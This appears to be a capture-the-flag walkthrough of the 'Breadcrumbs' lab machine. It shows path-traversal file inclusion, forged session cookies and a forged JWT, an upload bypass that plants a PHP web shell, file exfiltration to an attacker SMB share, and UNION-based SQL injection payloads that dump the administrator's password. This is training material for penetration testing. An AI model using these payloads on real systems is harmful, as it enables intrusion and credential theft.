**Skills Required**
Enumeration
Scripting
Code Review
**Skills Learned**
Forging PHP sessions
SQL Injection

The port 80(http) and 443(htps) are open, and we can enumerate them using the whatweb tool and through the browser

``` bash
❯ whatweb 10.10.10.228
http://10.10.10.228 [200 OK] Apache[2.4.46], Bootstrap[4.0.0], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1], IP[10.10.10.228], JQuery[3.2.1], OpenSSL[1.1.1h], PHP[8.0.1], Script[text/javascript], Title[Library], X-Powered-By[PHP/8.0.1], X-UA-Compatible[IE=edge]
```

Continuing with the enumeration, taking advantage of the port 445 (smb) being open. we use the crackmapexec tool

``` bash
❯ crackmapexec smb 10.10.10.228
SMB         10.10.10.228    445    BREADCRUMBS      [*] Windows 10.0 Build 19041 x64 (name:BREADCRUMBS) (domain:Breadcrumbs) (signing:False) (SMBv1:False)
```

Now using  the smbmap tool, we try to list the shared resources on the smb network

``` bash
❯ smbmap -H 10.10.10.228 -u 'null'
[!] Authentication error on 10.10.10.228
```

The access is denied, so we need credentials to be able to list the shared resources

Checking the website it appears to be  a book search application, we can use wfuzz to perform fuzzing in order to search for routes or files.
``` bash
wfuzz --hc=404 -t 200 -w /wordlist http://10.10.10.228/FUZZ
```

Wffuz discovered a login panel named "portal", and we can sign up. After logging in and exploring the website, there is a section that displays website issues, one of which is "PHPSESSID infiniti session duration", another thing to note  is that my user's rol requires approval. Additionally,  there is a section that show me the active users on the website. 
This suggests the possibility of user impersonation through manipulation of the json web token, but we need the secret key for this, an maybe another thing to considerate is XSS vulnerability that could potentially allow us to manipulate an active user into performing actions on our behalf .
``` bash
# 
|Maintenance|Fix PHPSESSID infinite session duration|
# 
|Paul|Active|
|paul|24|Admin|
```


Checking the file management section, this make a redirection to index.php, we need tho intercept the communication to try to view the file management section.
We could use burpsuite for this.

``` bash
#Intercept the connection with burpsuite -> right click -> Do intercept -> Response to this request -> Forward
-> edit the HTTP/1.1 302 Found to -> HTTP/1.1 200 OK -> Forward
-> Options -> Match and Replace -> Add ->  Type: Response header -> Match 302 Found -> response 200 OK -> OK
```

In this way we can see the content and it's an upload application that only allow to upload .zip files
We can bypass this easily and upload a php file with a malicious code that allow us to execute commands.
``` bash
# create the php file
<?php
echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

However there is another problem, Our user didn't have privileges to upload files, we need that an admin approve our user's rol.
It's seems that we need to find another way

Checking the book search section , when we try to open a book, this search in the local files to open the correct book , if we intercept the request with burp suite and change the local file name , maybe we can view sensitive local files
``` bash
file_get_contents(../books/book3.htm)
# using burpsuite and path traversal
book=../../../../../../../../Windows\System32\Drivers\etc\hosts&method=1
```

In this way we discovered a local file inclusion vulnerability
Taking advantage of this, we try to view the bookcontroller.php (http://10.10.10.228/includes/) script to gather more information about the system, in this script we found the path of the database file and in this we get credentials.
``` bash
# using burpsuite and path traversal
book=../includes/bookController.php&method=1

#edit the php file in nvim -> %s/\\r/\r/g -> %s/\\\//\//g

"<?php

if($_SERVER['REQUEST_METHOD'] == \"POST\"){
    $out = \"\";
    require '../db/db.php';

    $title = \"\";
    $author = \"\";

    if($_POST['method'] == 0){
        if($_POST['title'] != \"\"){
            $title = \"%\".$_POST['title'].\"%\";
        }
        if($_POST['author'] != \"\"){
            $author = \"%\".$_POST['author'].\"%\";
        }
        
    
        $query = \"SELECT * FROM books WHERE title LIKE ? OR author LIKE ?\";
        $stmt = $con->prepare($query);
        $stmt->bind_param('ss', $title, $author);
        $stmt->execute();
        $res = $stmt->get_result();
        $out = mysqli_fetch_all($res,MYSQLI_ASSOC);
    }

    elseif($_POST['method'] == 1){
        $out = file_get_contents('../books/'.$_POST['book']);
    }

    else{
        $out = false;
    }

    echo json_encode($out);
}"

# On burpsuite looking for the db file
book=../db/db.php&method=1
#edit the php file in nvim -> %s/\\r/\r/g -> %s/\\\//\//g
"<?php

$host=\"localhost\";
$port=3306;
$user=\"bread\";
$password=\"jUli901\";
$dbname=\"bread\";

$con = new mysqli($host, $user, $password, $dbname, $port) or die ('Could not connect to the database server' . mysqli_connect_error());
?>
"

```

We use crackmapexec to validate these credentials 
``` bash
❯ crackmapexec smb 10.10.10.228 -u 'bread' -p 'jUli901' -d 'WORGROUP.local'
SMB         10.10.10.228    445    BREADCRUMBS      [-] WORGROUP.local\bread:jUli901 STATUS_LOGON_FAILURE 
```

This credentials aren't valid for the system, so we try  connect to mysql
``` bash
❯ mysql -u 'bread' -p -h 10.10.10.228
mysql: Deprecated program name. It will be removed in a future release, use '/usr/bin/mariadb' instead
Enter password: 
ERROR 1130 (HY000): Host '10.10.14.5' is not allowed to connect to this MariaDB server
```

However, we are not authorized to connect to this server.

Taking back to the json web token, we  try to find the secret  taking advantage of the local file inclusion found before
``` bash
# Fuzz http://10.10.10.228/portal
wfuzz --hc=404 -w /wordlist http://10.10.10.228/portal/FUZZ
wfuzz --hc=404 -w /wordlist http://10.10.10.228/portal/FUZZ.php

# found uploads, includes, php, cookie.php

# using burpsuite and path traversal
book=../portal/cookie.php&method=1

#edit the php file in nvim -> %s/\\r/\r/g -> %s/\\\//\//g

<?php
/**
 * @param string $username  Username requesting session cookie
 * 
 * @return string $session_cookie Returns the generated cookie
 * 
 * @devteam
 * Please DO NOT use default PHPSESSID; our security team says they are predictable.
 * CHANGE SECOND PART OF MD5 KEY EVERY WEEK
 * */
function makesession($username){
    $max = strlen($username) - 1;
    $seed = rand(0, $max);
    $key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";
    $session_cookie = $username.md5($key);

    return $session_cookie;
}
```

The cookie.php file create the session cookie of the user, and we get the secret key, 
``` bash
# edit the cookie file, add in the final line
print(makesession("paul"));
<?php
/**
 * @param string $username  Username requesting session cookie
 * 
 * @return string $session_cookie Returns the generated cookie
 * 
 * @devteam
 * Please DO NOT use default PHPSESSID; our security team says they are predictable.
 * CHANGE SECOND PART OF MD5 KEY EVERY WEEK
 * */
function makesession($username){
    $max = strlen($username) - 1;
    $seed = rand(0, $max);
    $key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";
    $session_cookie = $username.md5($key);

    return $session_cookie;
}
print(makesession("paul"));

❯ php cookie.php
paul8c8808867b53c49777fe5559164708c3%  

# Check for posibles session cookies for the user paul
❯ for i in $(seq 1 1000); do php cookie.php; echo; done | sort -u
paul47200b180ccd6835d25d034eeb6e6390
paul61ff9d4aaefe6bdf45681678ba89ff9d
paul8c8808867b53c49777fe5559164708c3
paula2a6a014d3bee04d7df8d5837d62e8c5

# 
```

There are 4 possible session cookies. But we still need the secret for the Json web token
So we check for another php file, this time the filecontroller.php

``` bash
# using burpsuite and path traversal
book=../portal/includes/fileController.php&method=1

#edit the php file in nvim -> %s/\\r/\r/g -> %s/\\\//\//g
<?php
$ret = \"\";
require \"..\/vendor\/autoload.php\";
use \\Firebase\\JWT\\JWT;
session_start();

function validate(){
    $ret = false;
    $jwt = $_COOKIE['token'];

    $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';
    $ret = JWT::decode($jwt, $secret_key, array('HS256'));   
    return $ret;
}

if($_SERVER['REQUEST_METHOD'] === \"POST\"){
    $admins = array(\"paul\");
    $user = validate()->data->username;
    if(in_array($user, $admins) && $_SESSION['username'] == \"paul\"){
        error_reporting(E_ALL & ~E_NOTICE);
        $uploads_dir = '..\/uploads';
        $tmp_name = $_FILES[\"file\"][\"tmp_name\"];
        $name = $_POST['task'];

        if(move_uploaded_file($tmp_name, \"$uploads_dir\/$name\")){
            $ret = \"Success. Have a great weekend!\";
        }     
        else{
            $ret = \"Missing file or title :(\" ;
        }
    }
    else{
        $ret = \"Insufficient privileges. Contact admin or developer to upload code. Note: If you recently registered, please wait for one of our admins to approve it.\";
    }

    echo $ret;
}


```

In this php file we obtain the secret key for the json web token, and now in the jwt.io site we create the json web token of the admin user Paul

In this way we gain access as the user paul, no we can try to upload our malicious php file
``` bash
# create the php file
<?php
echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>

# bypass the .zip restriction / the server convert our malicious.php file to malicious.zip
# In burpsuite we can change this .zip to .php
# check in the url -> 10.10.10.228/portal/uploads/
```

Now that we upload our php file we can execute commands
``` bash

10.10.10.228/portal/uploads/malicious.php?cmd=whoami
breadcrumbs\www-data
```

 Enumerating the system

``` bash
❯ curl -s 'http://10.10.10.228/portal/uploads/malicious.php' --data-urlencode 'cmd=dir C:\Users\www-data\Desktop\xampp\htdocs\portal\'
<pre> Volume in drive C has no label.
 Volume Serial Number is 7C07-CD3A

 Directory of C:\Users\www-data\Desktop\xampp\htdocs\portal

02/08/2021  06:37 AM    <DIR>          .
02/08/2021  06:37 AM    <DIR>          ..
02/08/2021  06:37 AM    <DIR>          assets
02/01/2021  11:40 PM             3,956 authController.php
02/01/2021  10:40 PM               114 composer.json
11/28/2020  01:55 AM             6,140 composer.lock
12/09/2020  04:30 PM               534 cookie.php
02/08/2021  06:37 AM    <DIR>          db
02/08/2021  06:37 AM    <DIR>          includes
02/01/2021  07:59 AM             3,757 index.php
02/01/2021  02:57 AM             2,707 login.php
01/16/2021  02:47 PM               694 logout.php
02/08/2021  06:37 AM    <DIR>          php
02/08/2021  06:37 AM    <DIR>          pizzaDeliveryUserData
02/01/2021  02:58 AM             2,934 signup.php
09/27/2023  09:50 PM    <DIR>          uploads
02/08/2021  06:37 AM    <DIR>          vendor
               8 File(s)         20,836 bytes
               9 Dir(s)   6,544,650,240 bytes free

❯ curl -s 'http://10.10.10.228/portal/uploads/malicious.php' --data-urlencode 'cmd=dir C:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData'
<pre> Volume in drive C has no label.
 Volume Serial Number is 7C07-CD3A

 Directory of C:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData

02/08/2021  06:37 AM    <DIR>          .
02/08/2021  06:37 AM    <DIR>          ..
11/28/2020  02:48 AM               170 alex.disabled
11/28/2020  02:48 AM               170 emma.disabled
11/28/2020  02:48 AM               170 jack.disabled
11/28/2020  02:48 AM               170 john.disabled
01/17/2021  04:11 PM               192 juliette.json
11/28/2020  02:48 AM               170 lucas.disabled
11/28/2020  02:48 AM               170 olivia.disabled
11/28/2020  02:48 AM               170 paul.disabled
11/28/2020  02:48 AM               170 sirine.disabled
11/28/2020  02:48 AM               170 william.disabled
              10 File(s)          1,722 bytes
               2 Dir(s)   6,543,896,576 bytes free
</pre>%               

❯ curl -s 'http://10.10.10.228/portal/uploads/malicious.php' --data-urlencode 'cmd=type C:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData\*'
	"pizza" : "margherita",
	"size" : "large",	
	"drink" : "water",
	"card" : "VISA",
	"PIN" : "9890",
	"alternate" : {
		"username" : "juliette",
		"password" : "jUli901./())!",
	}
```

We obtain another credentials, checking with crackmapexec this user is a valid system user

``` bash
crackmapexec smb 10.10.10.228 -u 'juliette' -p 'jUli901./())!'
```

The port 22(SSH) is open, so we can connect with this credentials via SSH

``` bash
❯ ssh juliette@10.10.10.228
juliette@BREADCRUMBS C:\Users\juliette>whoami
breadcrumbs\juliette

juliette@BREADCRUMBS C:\Users\juliette\Desktop>type user.txt
19b3b761e3b7284b760c49aea9f15c75
```

We gain access as the user juliette using SSH
It's time to escalate privilage
``` bash
juliette@BREADCRUMBS C:\Users\juliette\Desktop>type todo.html
<html>
<style>
html{
background:black;
color:orange;
}
table,th,td{
border:1px solid orange;
padding:1em;
border-collapse:collapse;
}
</style>
<table>
        <tr>
            <th>Task</th>
            <th>Status</th>
            <th>Reason</th>
        </tr>
        <tr>
            <td>Configure firewall for port 22 and 445</td>
            <td>Not started</td>
            <td>Unauthorized access might be possible</td>
        </tr>
        <tr>
            <td>Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager</td>
            <td>In progress</td>
            <td>It stores passwords in plain text</td>
        </tr>
        <tr>
            <td>Add new features to password manager</td>
            <td>Not started</td>
            <td>To get promoted, hopefully lol</td>
        </tr>
</table>

</html>
```

I found something related to the "sticky notes" there is a way to exploit this searching for sensitive information.

``` bash
juliette@BREADCRUMBS C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState>dir    
01/15/2021  05:10 PM            20,480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
11/29/2020  04:10 AM             4,096 plum.sqlite
01/15/2021  05:10 PM            32,768 plum.sqlite-shm
01/15/2021  05:10 PM           329,632 plum.sqlite-wal

#download plum.sqlite-wal
#On my machine 
smbserver sharedfolder . -smb2support

#on the victim machine
copy plum.sqlite-wal \\10.10.14.5\sharedfolder\plum.sqlite-wal
❯ strings plum.sqlite-wal
development: fN3)sN5Ee@g
```

Using "strings" to list information containing in this file we obtain the credentials for the user "Development"

Now we connect via SSH with this user

``` bash
ssh development@10.10.10.228
```

We found a binary, so download it

``` bash
development@BREADCRUMBS C:\Development>dir
11/29/2020  04:11 AM            18,312 Krypter_Linux

#download Krypter_Linux
#On my machine 
smbserver sharedfolder . -smb2support

#on the victim machine
copy Krypter_Linux \\10.10.14.5\sharedfolder\Krypter_Linux

```

Using "strings" on this binary we discovered a URL using port 1234, but this port i'ts only visible locally
We use ssh with the -L parameter to connect using port-forwarding
``` bash
Requesting decryption key from cloud...
Account: Administrator
http://passmanager.htb:1234/index.php
method=select&username=administrator&table=passwords

ssh development@10.10.10.228 -L 1234:127.0.0.1:1234

#on the website
http://127.0.0.1:1234/index.php?method=select&username=administrator&table=passwords
	selectarray(1) { [0]=> array(1) { ["aes_key"]=> string(16) "k19D193j.<19391(" } }
```

This site return a "aes" cipher and the site is vulnerable to sql injection
``` markdown

**http://127.0.0.1:1234/index.php?method=select&username=administrator'&table=passwords**
select  
Fatal error: Uncaught TypeError: mysqli_fetch_all(): Argument #1 ($result) must be of type 

**http://127.0.0.1:1234/index.php?method=select&username=administrator' order by 1-- -&table=passwords**

**http://127.0.0.1:1234/index.php?method=select&username=administrator' union select schema_name from information_schema.schemata-- -&table=passwords**

"information_schema" "bread"

**http://127.0.0.1:1234/index.php?method=select&username=administrator' union select table_name from information_schema.tables where table_schema="bread"-- -&table=passwords**
"passwords" 

**http://127.0.0.1:1234/index.php?method=select&username=administrator' union select column_name from information_schema.columns where table_schema="bread" and table_name="passwords"-- -&table=passwords**

"id" "account" "password"  "aes_key" 

**http://127.0.0.1:1234/index.php?method=select&username=administrator' union select group_concat(account,":",password) from bread.passwords-- -&table=passwords**

"Administrator:H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw="
```

The sql injection returns the administrator password encrypted in base64 and other type of cipher,  using this with the previous "aes" cipher we can decrypt it using cyberchef
``` bash

cyberchef -> from base64 -> aes decrypt (utf8 + the cipher + input raw + IV 000000000000000000000...) 
->  p@ssw0rd!@#$9890./
```

We now have the administrator password, and we have successfully escalated privileges!
``` bash
administrator@BREADCRUMBS C:\Users\Administrator>whoami
breadcrumbs\administrator

administrator@BREADCRUMBS C:\Users\Administrator\Desktop>type root.txt
86764d598952f923a09f3f459518e87a
```


